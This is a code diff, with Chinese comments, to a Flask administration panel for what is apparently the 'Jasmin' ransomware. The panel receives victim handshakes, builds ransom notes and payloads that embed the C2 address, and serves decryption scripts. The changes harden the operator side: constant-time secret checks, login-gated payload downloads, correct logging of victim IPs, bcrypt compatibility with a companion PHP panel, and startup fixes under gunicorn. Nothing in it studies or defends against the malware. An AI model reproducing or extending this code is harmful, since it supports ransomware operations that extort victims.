@@ -18,6 +18,14 @@ def _verify_password(stored_hash, password):
 
 app = Flask(__name__)
 
+# nginx 只设 X-Forwarded-For / X-Real-IP，不启用 ProxyFix 的话
+# request.remote_addr 恒为 nginx 容器 IP —— 受害者 IP 全记错、限流 key 也全同名。
+try:
+    from werkzeug.middleware.proxy_fix import ProxyFix
+    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
+except Exception:
+    pass
+
 CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'config.json')
 PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
 TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates', 'payloads')
@@ -190,7 +198,8 @@ def install():
                 # 此处虽已白名单，仍用参数化形式防御未来改动
                 cur.execute("CREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET utf8mb4" % name)
                 conn.close()
-                cfg = {'database_url':url,'handshake_secret':secret,'installed':False}
+                cfg = load_config()
+                cfg.update({'database_url':url,'handshake_secret':secret,'installed':False})
                 json.dump(cfg, open(CONFIG_FILE,'w'))
                 app.config['SQLALCHEMY_DATABASE_URI'] = url
                 app.config['HANDSHAKE_SECRET'] = secret
@@ -209,7 +218,10 @@ def install():
             else:
                 with app.app_context():
                     Admin.query.filter_by(username=au).delete()
-                    db.session.add(Admin(username=au, password=generate_password_hash(ap_)))
+                    # 必须与 PHP 端一致用 bcrypt($2y$)：两面板共用同一个 master 表，
+                    # werkzeug 默认的 scrypt 哈希 PHP 的 password_verify 认不出来。
+                    _h = _bcrypt.hashpw(ap_.encode('utf-8'), _bcrypt.gensalt(rounds=10, prefix=b'2y')).decode('utf-8')
+                    db.session.add(Admin(username=au, password=_h))
                     db.session.commit()
                 cfg = load_config()
                 cfg['installed'] = True
@@ -293,7 +305,7 @@ def change_password():
         return jsonify(ok=False, msg='新密码过长（最长 72 字节）')
     if new != new2:
         return jsonify(ok=False, msg='两次输入的新密码不一致')
-    if secrets.compare_digest(cur, new):
+    if secrets.compare_digest(cur.encode('utf-8'), new.encode('utf-8')):
         return jsonify(ok=False, msg='新密码不能与当前密码相同')
     classes = sum(bool(_re.search(p, new)) for p in (r'[a-z]', r'[A-Z]', r'[0-9]', r'[^a-zA-Z0-9]'))
     if classes < 2:
@@ -357,7 +369,11 @@ def health():
 
 @app.route('/handshake', methods=['POST'])
 def handshake():
-    if request.form.get('handshake') != app.config['HANDSHAKE_SECRET']:
+    _got = request.form.get('handshake', '')
+    _want = app.config['HANDSHAKE_SECRET'] or ''
+    if not _want:
+        return 'Handshake secret not configured', 503
+    if not isinstance(_got, str) or not secrets.compare_digest(_got.encode('utf-8'), _want.encode('utf-8')):
         return 'Invalid', 403
     f = request.form
     systemid = f.get('systemid', '')
@@ -427,7 +443,7 @@ def generate():
     else:
         return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
     # 构建勒索信
-    srv = re.sub(r'/handshake\.php$', '', c2)
+    srv = re.sub(r'/handshake(\.php)?$', '', c2)
     if not srv: srv = 'http://<后台地址>'
     # 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh（纯 openssl），
     # Windows 用 jasmin_unlock.ps1（纯 PowerShell 7+，无需编译 exe）
@@ -470,10 +486,21 @@ def generate():
 
 @app.route('/payloads/<path:filename>')
 def download_payload(filename):
-    # Block plaintext private key and secret
+    """解密工具与加密私钥匿名可取；生成载荷与密钥备份必须登录。
+
+    载荷内嵌 C2 地址与握手密钥 —— 匿名可取等于把回连凭据公开出去。
+    """
     base = os.path.basename(filename)
-    if base in ('jasmin_private.pem', '.key_secret'):
+    if base in ('jasmin_private.pem', '.key_secret') or '.bak.' in base:
         return 'Forbidden', 403
+    public = (
+        base.startswith('jasmin_unlock.') or
+        base.startswith('jasmin_decrypt') or
+        base == 'jasmin_diagnose.sh' or
+        base == 'jasmin_private.pem.enc'
+    )
+    if not public and 'username' not in session:
+        return redirect(url_for('login'))
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
 @app.route('/download_key')
@@ -630,9 +657,16 @@ def do_update():
         return jsonify(ok=False, msg=f'下载更新失败: {e}')
 
 # ── Startup ──
-if __name__ == '__main__':
-    if is_installed():
+# 建表与幂等迁移必须在模块导入时执行 —— 容器用 `gunicorn app:app` 启动，
+# 此时 __name__ == 'app'，写在 __main__ 里的初始化永远不会跑，
+# 老库缺列会让 dashboard 直接 500。
+if is_installed():
+    try:
         with app.app_context():
             db.create_all()
             ensure_schema()
+    except Exception as _e:
+        print(f'[schema] startup init skipped: {_e}')
+
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
